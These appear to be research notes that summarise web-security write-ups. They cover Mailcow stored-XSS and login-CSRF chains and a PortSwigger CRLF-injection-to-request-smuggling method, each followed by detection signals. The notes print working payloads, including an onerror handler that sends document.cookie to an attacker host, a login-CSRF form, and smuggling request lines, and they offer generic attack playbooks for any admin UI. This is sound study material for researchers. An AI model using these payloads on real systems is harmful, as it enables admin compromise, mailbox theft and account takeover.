  2. Unauthenticated injection into that log: Autodiscover is unauthenticated BY DESIGN and the email address is unvalidated → `POST /Autodiscover/Autodiscover.xml` (Content-Type: text/xml) with `<EMailAddress>&lt;img src=x onerror=alert(origin)&gt;</EMailAddress>`. When an admin later opens Dashboard → Logs → Autodiscover, the payload executes on the Mailcow origin → the admin session can read any user's mailbox and reconfigure the instance (rated Critical).
  3. Second sink (Quarantine): attachment FILENAMES are concatenated unescaped into HTML. The delivery problem — how do you get your email into the queue the admin inspects? — is solved with the EICAR test string: attach a file whose BODY is the standard EICAR AV signature and whose `Content-Disposition` filename is the payload (`att.add_header('Content-Disposition','attachment',filename='<img src=x onerror=alert(origin)>.exe')` with `att = MIMEApplication(b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*', _subtype='octet-stream')`). Every AV flags EICAR, so the mail is quarantined without the attacker sending real malware; the admin opens Quarantine → Show item → XSS on the Mailcow origin (unauthenticated → instance takeover).
  4. Self-XSS site: the Login-History table renders `item.real_rip` unescaped, and the "IP" is taken from the `X-Real-IP` header BY DEFAULT with no validation (trusted whenever no proxy sets it) → log in with `X-Real-Ip: "><img src onerror=alert(origin)>` and the payload is stored under YOUR OWN account (useless on its own).
  5. Escalate with LOGIN CSRF: the login POST has no CSRF protection, so a page you host auto-submits YOUR credentials (`<form action="http://mailcow.local/" method="POST"><input name="login_user" value="attacker"><input name="pass_user" value="attacker">` + `document.forms[0].submit()`), which logs the VICTIM into the ATTACKER's account; redirect them to `/user` and the stored XSS fires.
  6. Read the victim's REAL session across tabs: keep the victim's own mailbox open (tab 1); tab 1 opens tab 2 with the login-CSRF form (slightly delayed); tab 1 navigates to the victim's mailbox loading the data; tab 2 submits the form, opening tab 3 logged into the attacker's account; tab 2 redirects to `/user` where the stored XSS fires and uses a reference to `window.opener` to read and exfiltrate `document.body.innerHTML` from tab 1 — which is still the victim's authenticated mailbox. Two clicks (opening the two extra tabs) and the attacker has the victim's email; from there the mailbox's password-reset flows pivot into connected accounts.
DETECTION SIGNAL: an admin/log page that renders attacker-influenced strings (email address, filename, User-Agent, IP) via `innerHTML`/DataTables/jQuery `.append()` WITHOUT escaping — check each column individually, because neighbours are often escaped while one is missed; an unauthenticated endpoint that writes into a surface an admin later views (Autodiscover, mail/attachment handling, any "logs" menu); an AV/quarantine queue you can populate with an EICAR-bodied attachment; an unvalidated `X-Real-IP`/`X-Forwarded-For` stored and then rendered; a login POST with no CSRF token (login CSRF → session swap).
CHAIN: unauthenticated input reaches an admin-rendered log/quarantine cell without escaping (primitive: stored XSS in an admin context) -> the admin's session executes it on a routine page view, giving mailbox read and instance reconfiguration (escalation: admin compromise from an external, unauthenticated actor) — or, in the third bug, a self-XSS payload planted in the attacker's OWN login history is moved in front of the victim by a LOGIN CSRF, and the injected tab reads the victim's still-open mailbox through `window.opener` (escalation: the victim's email is stolen = account-takeover pivot via the mailbox's password resets). Impact classes: stored XSS in an admin surface (CVSS v4.0 8.9 / 8.9 / 7.0) and an ATO chain.
TRANSFERABLE TEST: on any app with an admin UI, (a) find columns rendered by DataTables/jQuery concatenation and inject `<img src=x onerror=document.location='//you/?'+document.cookie>` through an unauthenticated field that lands in a log the admin reads (Autodiscover email, filename, UA, IP); (b) if a quarantine/AV queue exists, deliver with an EICAR-bodied attachment so the admin opens your entry; (c) for a sink that only shows to you, pair it with a LOGIN CSRF (auto-submit YOUR credentials so the victim is logged in as you) and read the victim's still-open tab via `window.opener` — first check whether the login POST carries a CSRF token. Rule: **enumerate every column/field an admin UI renders and assume one is unescaped when its neighbour is — the cheapest unauthenticated→admin path is an input that is only ever displayed to an admin (a log, a quarantine queue, a login history); and when a payload only shows to you, escalate with login CSRF (victim logged into your account) plus `window.opener` to read their still-open session.**
DEDUPE: `mailcow`, `Autodiscover`, `DataTables`, `EICAR`, `40872`, `40873`, `40875`, `FreddleSpl0it` = 0 hits across all three write targets. Reviewed and NOT re-recorded as new: `login CSRF` (10/10 hits) is recorded only in the OAuth/`state`/session-fixation context (playbook V-17), never as a self-XSS→login-CSRF→`opener` chain; `X-Real-IP` hits are proxy-header RECON material and (in the newest batch) the Better-Messages identity-from-a-header entry — a different SINK (a stored-XSS render, not an identity test); `opener` hits are `Cross-Origin-Opener-Policy` header material. NEW = DataTables/HTML-by-default unescaped cell as the admin XSS sink, EICAR-to-quarantine as a delivery channel, and the self-XSS + login-CSRF + `window.opener` read of the still-open victim session.

SOURCE: https://portswigger.net/research/making-http-header-injection-critical-with-one-prompt  2026-11-08
ROUTE: assigned source 1; `web_extract` rendered the FULL body (no elision, ~7.4 KB) — no fallback needed. Published Wednesday, 4 November 2026 (inside the window); read in full 2026-11-08.
STATUS: UNVERIFIED (not reproduced) — no Burp AT session and no desync-capable target were used; every phase, payload and status-code claim is the article's own.
CLASS: HTTP request header injection / CRLF injection ESCALATED TO HTTP request smuggling (desync) — a critical, in-class chain that ends in cache poisoning / random-user redirect / access-control bypass. The INJECTION itself is the chain primitive; the desync exploit is the finding.
CORE METHOD:
  1. PHASE 1 — locate WHERE upstream your payload lands. A path insertion point is frequently REWRITTEN into a custom header by an edge/proxy, and the only thing that matters is whether that custom header sits before or after the upstream `Host` header (it determines whether your injected `Host`/framing lines are honoured). Probe it: `GET /%0d%0a%0d%0a HTTP/1.1` returns a normal status, but `GET /%0d%0aHost:%20x%0d%0a%0d%0a HTTP/1.1` returns 400 — and the upstream request looks like `GET / HTTP/1.1  Host: example.com  X-Original-path: /  Host: x`, i.e. your injection is INSIDE a custom header (`X-Original-path`) that appears AFTER the upstream `Host`. The scan check / skill accept ANY insertion point, not only the path.
  2. PHASE 2 — prove the split. Build request-splitting payloads that smuggle a second request line inside the injected header, using a BOGUS protocol version or verb so a successfully-split request produces a distinctive status code: `GET /%0d%0a%0d%0aGET%20/%20HTTP/13.37%0d%0aHost:%20example.com %0d%0aContent-Length:%20150%0d%0a%0d%0a HTTP/1.1` and the `TRACE / HTTP/1.1` variant. Fuzz several different prefixes; once you collect 2-3 DISTINCT status codes you have proof the prefixes are modifying requests upstream (a real split), and you move to exploitation.
  3. PHASE 3 — find an exploit gadget with a mini-crawl: an OPEN REDIRECT inducible via the `Host` header, the `X-Forwarded-Host` header, or an absolute URL. (A path that 301/302s and builds its `Location` from one of those is the gadget.)
  4. PHASE 4 — combine the phase-2 structure with the phase-3 gadget. Example: `/assets` redirects to `/assets/` using the host header, so `GET /%0d%0a%0d%0aGET%20/assets%20HTTP/1.1%0d%0aHost:%20collaborator.net%0d%0a Content-Length:%20150%0d%0a%0d%0a HTTP/1.1` repeatedly sent over DIFFERENT connections serves the collaborator redirect to OTHER users sharing the poisoned stream — the exploit is the primitive for FULL-SITE TAKEOVER when chained with cache poisoning (the article deliberately chose this safe open-redirect route over Response Queue Poisoning, which it says was "so dangerous" in testing it was avoided).
  5. FALLBACK — if phase 2 proves a full desync is impossible, a second skill (CRLF-Powered Tunnelling) attempts BLIND REQUEST TUNNELLING, which "with some luck" finds an ACCESS CONTROL BYPASS exploit; if that fails you get a pre-populated Intruder session to pair with your own wordlists. Skills fail gracefully with bail points: no gadget ⇒ still a validated desync finding; too few distinct status codes ⇒ a tentative issue.
DETECTION SIGNAL: any point where `%0d%0a` survives into the upstream request; a probe whose status FLIPS to 400 when you add a second `Host` header (your injection is in a custom header after the upstream Host); a set of prefix permutations that yield DISTINCT status codes (the split is real); an open redirect whose `Location` is built from `Host` / `X-Forwarded-Host` / an absolute URL. Burp Scanner already flags "header injection" — the escalation, not the flag, is the deliverable.
